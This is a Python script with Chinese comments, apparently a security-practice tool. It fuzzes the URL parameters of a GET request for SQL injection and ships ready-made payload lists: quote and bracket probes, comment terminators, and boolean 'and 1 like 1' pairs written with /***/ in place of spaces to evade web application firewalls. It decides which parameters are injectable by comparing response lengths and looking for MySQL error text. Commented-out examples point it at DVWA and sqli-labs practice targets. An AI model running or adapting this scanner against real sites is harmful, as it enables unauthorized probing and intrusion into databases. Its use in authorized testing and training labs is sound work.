# GET型
# 先用特殊字符检测，然后判断是数字型还是字符型注入
# 用/***/替换空格，用like替换=   具体案例看漏洞集合\骚姿势漏洞\绕Waf注入
import requests
from termcolor import cprint
from urllib.parse import urlparse

class Fuzz:
    def __init__(self, url, cookie, postPath=None):
        self.url = url                                          # url必须是带有http或https协议
        self.headers = {"cookie": cookie}
        try:
            self.standard_length = len(requests.get(self.url, headers=self.headers).text) # 正常url响应包的长度
        except Exception as e:
            self.standard_length = 0
        self.params = urlparse(self.url).query                  # 获取url链接的参数
        self.paramsList = self.params.split('&')                # 将字符串型的参数改为以&分割的列表

        # 单引号，双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
        self.test = ["'", '"', '\\', '/***/or', '/***/xor', '@', '%', '$', '^', '!', '[']
        # 注释符 '--+', '-- ', '%23'
        self.Notes = [' ', '--+', '%23']
        # 单引号，双引号，括号  quotes:引号 brackets:括号
        self.quotes_brackets = ["\\", "'", '"', "')", '")']

        # digit_bypass可过数字型注入的waf
        # self.digit_bypass = [['1', '0'], ['1-0', '1-1'], ['1+0', '1+1'], ['1*0', '1*1'], ['2/1', '0/1'],
        #                 ['2<<1', '0<<2'], ['2>>1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
        #                 ['1&&1', '0&&1'], ['1^1', '1^0'], ['1%3', '3%3']]
        # 精简版：↓
        self.digit_bypass = [['1', '0'], ['2<<1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
                             ['1&&1', '0&&1'], ['1^1', '1^0']]

        self.nums = len(self.paramsList) * len(self.test) + len(self.paramsList) * len(self.quotes_brackets) * len(self.Notes) + len(self.paramsList) * len(self.digit_bypass)  # 计算共请求次数
        cprint('[{}] 测试 : [{}] [{}]  :  {}'.format(self.nums, self.standard_length, self.url, self.params),'red')  # 打印正常包的响应长度
        self.num = 1                                            # 计数
        self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads = [], [], [], []


    # 返回请求url的响应包和响应包长度
    def text_length_return(self, url):
        try:
            text = requests.get(url, headers=self.headers).text
            return text, len(text)
        except Exception as e:
            return '', 0

    # 单引号，双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
    def test_sql(self):
        for i in range(len(self.paramsList)):
            for each_test in self.test:
                payload_param = self.paramsList[i] + each_test  # 构造其中一个参数的payload
                payload = self.url.replace(self.paramsList[i], payload_param)  # 构造好的参数payload替换掉原先的参数
                text, payload_length = self.text_length_return(payload)  # payload_length1是请求带payload的响应包的长度
                print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length, payload))

                # 当请求错误的时候，payload_length1的值为0，然后退出该循环
                if self.standard_length == 0 or payload_length == 0:
                    cprint('[连接错误] : {}'.format(payload), 'red')
                    continue

                if 'SQL syntax' in text:
                    out_ret = '[+{}+] SQL syntax  [{}] payload : [{}]'.format(self.num, payload_length, payload)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'Warning' in text:
                    out_ret = '[+{}+] Warning  [{}] payload : [{}]'.format(self.num, payload_length, payload)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'mysql_error' in text:
                    out_ret = '[+{}+] mysql_error  [{}] payload : [{}]'.format(self.num, payload_length, payload)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif self.standard_length != payload_length:
                    out_ret = '[${}$] 可能存在数字注入  [{}] payload : [{}]'.format(self.num, payload_length, payload)
                    cprint(out_ret, "blue")
                    self.BluePayloads.append(out_ret)
                else:
                    out_ret = '[-{}-] 不是数字型注入。'.format(self.num)
                    # cprint(out_ret, 'green')
                    self.GreenPayloads.append(out_ret)

                self.num += 1



    # 请求数字型payload
    def req_digit_payload(self):
        '''
            因为是判断数字型，所以不需要注释符。
        '''

        for i in range(len(self.paramsList)):
            for each_pass in self.digit_bypass:
                payload1_param = self.paramsList[i] + '/***/and/***/{}'.format(each_pass[0])     # 构造其中一个参数的payload
                payload1 = self.url.replace(self.paramsList[i], payload1_param) # 构造好的参数payload替换掉原先的参数
                text1, payload_length1 = self.text_length_return(payload1)       # payload_length1是请求带payload的响应包的长度

                payload2_param = self.paramsList[i] + '/***/and/***/{}'.format(each_pass[1])
                payload2 = self.url.replace(self.paramsList[i], payload2_param)
                text2, payload_length2 = self.text_length_return(payload2)
                print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length1, payload1))
                print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length2, payload2))

                # 当请求错误的时候，payload_length1的值为0，然后退出该循环
                if self.standard_length == 0 or payload_length1 == 0:
                    cprint('[连接错误] : {}'.format(payload1), 'red')
                    continue

                # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关

                if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                    out_ret = '[+{}+] 数字型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                    cprint(out_ret, "red")
                    self.RedPayloads.append(out_ret)
                elif 'SQL syntax' in text1 or 'SQL syntax' in text2:
                    out_ret = '[+{}+] SQL syntax  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'Warning' in text1 or 'Warning' in text2:
                    out_ret = '[+{}+] Warning  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif 'mysql_error' in text1 or 'mysql_error' in text2:
                    out_ret = '[+{}+] mysql_error  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                    cprint(out_ret, "yellow")
                    self.YellowPayloads.append(out_ret)
                elif self.standard_length != payload_length1:
                    out_ret = '[${}$] 可能存在数字注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                    cprint(out_ret, "blue")
                    self.BluePayloads.append(out_ret)
                else:
                    out_ret = '[-{}-] 不是数字型注入。'.format(self.num)
                    # cprint(out_ret, 'green')
                    self.GreenPayloads.append(out_ret)

                self.num += 1

    # 请求字符型payload
    def req_char_payload(self):
        '''
            因为是判断字符型，所以需要注释符。
        '''

        for i in range(len(self.paramsList)):
            for each in self.quotes_brackets:
                for each_note in self.Notes:
                    payload1_param = self.paramsList[i] + "{}/***/and/***/1/***/like/***/1/***/{}".format(each, each_note)
                    payload1 = self.url.replace(self.paramsList[i], payload1_param)
                    text1, payload_length1 = self.text_length_return(payload1)  # payload_length1是请求带payload的响应包的长度

                    payload2_param = self.paramsList[i] + "{}/***/and/***/1/***/like/***/2/***/{}".format(each, each_note)
                    payload2 = self.url.replace(self.paramsList[i], payload2_param)
                    text2, payload_length2 = self.text_length_return(payload2)
                    print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length1, payload1))
                    print('[:{}:] 测试 : [{}] {}'.format(self.num, payload_length2, payload2))

                    # 当请求错误的时候，payload_length1的值为0，然后退出该循环
                    if self.standard_length == 0 or payload_length1 == 0:
                        cprint('[连接错误] : {}'.format(payload1), 'red')
                        continue

                    # 为了过滤无论and 1=1还是and 1=2页面都不变的注入点, 因为如果都不变，则payload_length1等于payload_length2。例如第一关

                    if self.standard_length == payload_length1 and payload_length1 != payload_length2:
                        out_ret = '[+{}+] 字符型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                        cprint(out_ret, "red")
                        self.RedPayloads.append(out_ret)
                    elif 'SQL syntax' in text1 or 'SQL syntax' in text2:
                        out_ret = '[+{}+] SQL syntax  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                        cprint(out_ret, "yellow")
                        self.YellowPayloads.append(out_ret)
                    elif 'Warning' in text1 or 'Warning' in text2:
                        out_ret = '[+{}+] Warning  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                        cprint(out_ret, "yellow")
                        self.YellowPayloads.append(out_ret)
                    elif 'mysql_error' in text1 or 'mysql_error' in text2:
                        out_ret = '[+{}+] mysql_error  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                        cprint(out_ret, "yellow")
                        self.YellowPayloads.append(out_ret)
                    elif self.standard_length != payload_length1:
                        out_ret = '[${}$] 可能存在字符型注入  [{}] payload : [{}]'.format(self.num, payload_length1, payload1)
                        cprint(out_ret, "blue")
                        self.BluePayloads.append(out_ret)
                    else:
                        out_ret = '[-{}-] 不是字符型注入。'.format(self.num)
                        # cprint(out_ret, 'green')
                        self.GreenPayloads.append(out_ret)

                    self.num += 1

    def attack(self):
        self.test_sql()
        self.req_digit_payload()
        self.req_char_payload()
        return self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads


# 这是单独使用脚本
#cookies = str(input('cookies : '))
# cookies = 'PHPSESSID=mfo83ugq1km65d6oa2bb0fds43; security=low'
# url1 = "http://demo.dvwa.com/vulnerabilities/sqli/?id=1&Submit=Submit#"

# cookies = None
# url1 = 'http://demo.sqli.com/Less-2/?id=1&c=2'
# Fuzz(url1, cookies).attack()
